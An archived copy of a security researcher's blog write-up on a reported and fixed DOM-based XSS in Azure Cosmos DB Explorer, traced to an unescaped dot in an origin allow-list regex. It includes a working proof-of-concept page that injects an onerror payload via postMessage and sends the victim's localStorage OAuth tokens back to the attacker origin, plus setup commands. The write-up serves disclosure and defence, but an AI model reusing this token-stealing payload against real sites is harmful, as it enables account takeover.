---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-02-24_microsoft-azure-account-takeover-via-dom-based-xss-in-cosmos-db-explorer.md
original_filename: 2023-02-24_microsoft-azure-account-takeover-via-dom-based-xss-in-cosmos-db-explorer.md
title: Microsoft Azure Account Takeover via DOM-based XSS in Cosmos DB Explorer
category: documents
detected_topics:
- xss
- oauth
- sso
- idor
- command-injection
- otp
tags:
- imported
- documents
- xss
- oauth
- sso
- idor
- command-injection
- otp
language: en
raw_sha256: 8e9c7f86f4bf88d4efa252d21e964f790bee61f5b4f17259a2b4771f92f6f32e
text_sha256: d1c94e985bfa400700126e5d685450bd0dda3004f8dc0705a926feba78b0359a
ingested_at: '2026-06-28T07:32:18Z'
sensitivity: unknown
redactions_applied: false
---

# Microsoft Azure Account Takeover via DOM-based XSS in Cosmos DB Explorer

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-02-24_microsoft-azure-account-takeover-via-dom-based-xss-in-cosmos-db-explorer.md
- Source Type: markdown
- Detected Topics: xss, oauth, sso, idor, command-injection, otp
- Ingested At: 2026-06-28T07:32:18Z
- Redactions Applied: False
- Raw SHA256: `8e9c7f86f4bf88d4efa252d21e964f790bee61f5b4f17259a2b4771f92f6f32e`
- Text SHA256: `d1c94e985bfa400700126e5d685450bd0dda3004f8dc0705a926feba78b0359a`


## Content

---
title: "Microsoft Azure Account Takeover via DOM-based XSS in Cosmos DB Explorer"
page_title: "Microsoft Azure Account Takeover via DOM-based XSS in Cosmos DB Explorer | STAR Labs"
url: "https://starlabs.sg/blog/2023/02-microsoft-azure-account-takeover-via-dom-based-xss-in-cosmos-db-explorer/"
final_url: "https://starlabs.sg/blog/2023/02-microsoft-azure-account-takeover-via-dom-based-xss-in-cosmos-db-explorer/"
authors: ["Ngo Wei Lin (@Creastery)"]
programs: ["Microsoft (Azure)"]
bugs: ["Account takeover", "DOM XSS"]
publication_date: "2023-02-24"
added_date: "2023-02-26"
source: "pentester.land/writeups.json"
original_index: 1478
---

Research February 24, 2023 By Ngo Wei Lin 5 min read

# Microsoft Azure Account Takeover via DOM-based XSS in Cosmos DB Explorer

Table of Contents

  * About the DOM XSS Vulnerability
  * Full Technical Details – Researcher’s Point of View
  * Incorrect Origin Check
  * DOM-based XSS
  * A Proof-of-Concept for the DOM XSS Vulnerability
  * Setting Up Environment
  * How Victim gets Compromised
  * Recommendations
  * Final Thoughts

Upon finding the vulnerability, our team member, Ngo Wei Lin ([@Creastery](https://twitter.com/creastery)), immediately reported it to the Microsoft Security Response Center (MSRC) on 19th March 2022, who fixed the important issue with a [fix commited in the repo](https://github.com/Azure/cosmos-explorer/commit/496f596f385e732e47579bd1b45b9ee5868fafac) within seven days, which is impressive and a much faster response than other Microsoft bugs which we reported previously. The fix was pushed down to [Azure Cosmos DB Explorer](https://cosmos.azure.com) on 31st March 2022.

## About the DOM XSS Vulnerability

The Azure Cosmos DB Explorer incorrectly accepts and processs cross-origin messages from certain domains. A remote attacker can take over a victim Azure user’s account by delivering a DOM-based XSS payload via a cross-origin message.

## Full Technical Details – Researcher’s Point of View

The root cause analysis is performed using the latest changeset ([d1587ef](https://github.com/Azure/cosmos-explorer/commit/d1587ef033914cfc540c95421b830e52087f4114)) of the [Azure/cosmos-explorer](https://github.com/Azure/cosmos-explorer) repository at the point of discovering the vulnerability.

### Incorrect Origin Check

The relevant vulnerable code from [/src/ConfigContext.ts](https://github.com/Azure/cosmos-explorer/blob/d1587ef033914cfc540c95421b830e52087f4114/src/ConfigContext.ts#L50-59) is shown below:
  
  
  let configContext: Readonly<ConfigContext> = {
  platform: Platform.Portal,
  allowedParentFrameOrigins: [
  `^https:\\/\\/cosmos\\.azure\\.(com|cn|us)$`,
  `^https:\\/\\/[\\.\\w]*portal\\.azure\\.(com|cn|us)$`,
  `^https:\\/\\/[\\.\\w]*portal\\.microsoftazure.de$`,
  `^https:\\/\\/[\\.\\w]*ext\\.azure\\.(com|cn|us)$`,
  `^https:\\/\\/[\\.\\w]*\\.ext\\.microsoftazure\\.de$`,
  `^https://cosmos-db-dataexplorer-germanycentral.azurewebsites.de$`, //vulnerable
  ],
  ...
  }
  

Note that `configContext.allowedParentFrameOrigins` is used in [/src/Utils/MessageValidation.ts](https://github.com/Azure/cosmos-explorer/blob/d1587ef033914cfc540c95421b830e52087f4114/src/Utils/MessageValidation.ts), where the origin check is performed:
  
  
  export function isInvalidParentFrameOrigin(event: MessageEvent): boolean {
  return !isValidOrigin(configContext.allowedParentFrameOrigins, event);
  }
  
  function isValidOrigin(allowedOrigins: string[], event: MessageEvent): boolean {
  const eventOrigin = (event && event.origin) || "";
  const windowOrigin = (window && window.origin) || "";
  if (eventOrigin === windowOrigin) {
  return true;
  }
  
  for (const origin of allowedOrigins) {
  const result = new RegExp(origin).test(eventOrigin);
  if (result) {
  return true;
  }
  }
  console.error(`Invalid parent frame origin detected: ${eventOrigin}`);
  return false;
  }
  

Observe that the last regular expression (`^https://cosmos-db-dataexplorer-germanycentral.azurewebsites.de$`) is incorrect, as metacharacters (e.g. in regular expressions, the character `.` matches any character) are not properly escaped.

This means that the following domains are also incorrectly treated as trusted sources of cross-origin messages:

  * `https://cosmos-db-dataexplorer-germanycentralAazurewebsites.de`
  * `https://cosmos-db-dataexplorer-germanycentralBazurewebsites.de`
  * …
  * `https://cosmos-db-dataexplorer-germanycentralYazurewebsites.de`
  * `https://cosmos-db-dataexplorer-germanycentralZazurewebsites.de`

As such, an attacker can purchase any of the above domains to send cross-origin messages to `cosmos.azure.com`, which will be accepted and processed.

### DOM-based XSS

The relevant vulnerable code from [/src/Controls/Heatmap/Heatmap.ts](https://github.com/Azure/cosmos-explorer/blob/d1587ef033914cfc540c95421b830e52087f4114/src/Controls/Heatmap/Heatmap.ts#L221-268) is shown below:
  
  
  export function handleMessage(event: MessageEvent) {
  if (isInvalidParentFrameOrigin(event)) {
  return;
  }
  
  if (typeof event.data !== "object" || event.data["signature"] !== "pcIframe") {
  return;
  }
  if (
  typeof event.data.data !== "object" ||
  !("chartData" in event.data.data) ||
  !("chartSettings" in event.data.data)
  ) {
  return;
  }
  Plotly.purge(Heatmap.elementId);
  
  document.getElementById(Heatmap.elementId)!.innerHTML = "";
  const data = event.data.data;
  const chartData: DataPayload = data.chartData;
  const chartSettings: HeatmapCaptions = data.chartSettings;
  const chartTheme: PortalTheme = data.theme;
  if (Object.keys(chartData).length) {
  new Heatmap(chartData, chartSettings, chartTheme).drawHeatmap();
  } else {
  const chartTitleElement = document.createElement("div");
  chartTitleElement.innerHTML = data.chartSettings.chartTitle;  // XSS
  chartTitleElement.classList.add("chartTitle");
  
  const noDataMessageElement = document.createElement("div");
  noDataMessageElement.classList.add("noDataMessage");
  const noDataMessageContent = document.createElement("div");
  noDataMessageContent.innerHTML = data.errorMessage;  // XSS
  
  noDataMessageElement.appendChild(noDataMessageContent);
  
  if (isDarkTheme(chartTheme)) {
  chartTitleElement.classList.add("dark-theme");
  noDataMessageElement.classList.add("dark-theme");
  noDataMessageContent.classList.add("dark-theme");
  }
  
  document.getElementById(Heatmap.elementId)!.appendChild(chartTitleElement);
  document.getElementById(Heatmap.elementId)!.appendChild(noDataMessageElement);
  }
  }
  
  window.addEventListener("message", handleMessage, false);
  

Observe that `event.data.chartSettings.chartTitle` and `event.data.errorMessage` can result in DOM-based XSS. In this case, an attacker who satisfies the origin check can send cross-origin messages to perform DOM-based XSS on `cosmos.azure.com`.

Examining the `Content-Security-Policy` header, it can be confirmed that inline scripts are permitted.
  
  
  content-security-policy: frame-ancestors 'self' portal.azure.com *.portal.azure.com portal.azure.us portal.azure.cn portal.microsoftazure.de df.onecloud.azure-test.net
  

When the vulnerabilities are chained together, an attacker can trigger a DOM-based XSS on `cosmos.azure.com` to exfiltrate Azure user’s OAuth tokens.

### A Proof-of-Concept for the DOM XSS Vulnerability

This proof-of-concept assumes the use of the domain `cosmos-db-dataexplorer-germanycentralAazurewebsites.de`. However, note that any other domain which satisfies the origin check would work as well.

#### Setting Up Environment

**Option 1:** Purchase the domain `cosmos-db-dataexplorer-germanycentralAazurewebsites.de` and host the following malicious webpage:
  
  
  <html>
  <head>
  <title>1-click XSS on cosmos.azure.com</title>
  <script>
  var w;
  var attacker_origin = 'https://cosmos-db-dataexplorer-germanycentralAazurewebsites.de/';
  function xss() {
  w = window.open('https://cosmos.azure.com/heatmap.html')
  setTimeout(function() {
  w.postMessage({signature:'pcIframe', data:{chartData:{}, chartSettings:{chartTitle:`<img src onerror="
  localStorageJSON = JSON.stringify(Object.assign({}, localStorage));
  window.opener.postMessage({exfil: localStorageJSON}, '${attacker_origin}');
  alert('XSS on ' + document.domain);
  ">`}}}, 'https://cosmos.azure.com');
  }, 2000);
  }
  
  window.onmessage = function(event) {
  if (event.origin === 'https://cosmos.azure.com') {
  document.getElementById("exfil").innerText = event.data.exfil;
  }
  }
  </script>
  </head>
  <body>
  <h1>1-click XSS on cosmos.azure.com</h1>
  <button onclick="xss()">1-click XSS</button>
  <br /><br />
  Exfiltrated OAuth tokens:<br />
  <textarea id="exfil" rows="45" cols="100" spellcheck="false"></textarea>
  </body>
  </html>
  

**Option 2:** Instead of purchasing the domain, execute the following commands to do DNS rebinding and start a HTTPS webserver using self-signed TLS certificate locally. Note that it is also necessary to import the self-signed Root CA certificate (provided as `root_ca.crt`) to the web browser.
  
  
  $ echo '127.0.0.1 cosmos-db-dataexplorer-germanycentralAazurewebsites.de' | sudo tee /etc/hosts
  $ unzip poc.zip -d ./poc/ && cd ./poc/;
  $ sudo python3 serve.py
  

#### How Victim gets Compromised

  1. Navigate to <https://cosmos.azure.com/> and log in to an Azure account.
  2. Navigate to `https://cosmos-db-dataexplorer-germanycentralAazurewebsites.de` hosting the malicious webpage and then click the `1-click XSS` button.
  3. Observe that the OAuth tokens stored in `localStorage` are being displayed in an alert window: ![XSS on cosmos.azure.com](/blog/2023/images/Azure-DOM-XSS-poc.png)

## Recommendations

To eliminate the vulnerability, ensure that the regular expression metacharacters are properly escaped. This suggested fix was accepted and used by Microsoft in [PR #1239](https://github.com/Azure/cosmos-explorer/pull/1239), which was committed into the codebase on 26th March 2022.

For example:
  
  
  `^https://cosmos-db-dataexplorer-germanycentral.azurewebsites.de$`
  

Should be properly escaped to:
  
  
  `^https:\\/\\/cosmos-db-dataexplorer-germanycentral\\.azurewebsites\\.de$`
  

## Final Thoughts

In this particular incident, a remote attacker can takeover a victim user’s Azure session and conduct post-exploitation to reach and compromise their cloud assets. All of this is possible because of a _single, unescaped dot_!

In general, when using `window.postMessage()`, care must be taken to ensure that origin checks are present and performed correctly.

As demonstrated above, improper origin verification of the message sender’s origin may allow for cross-site scripting attacks in some scenarios, such as using HTML responses from a trusted external origin and appending them to the current webpage’s DOM tree.
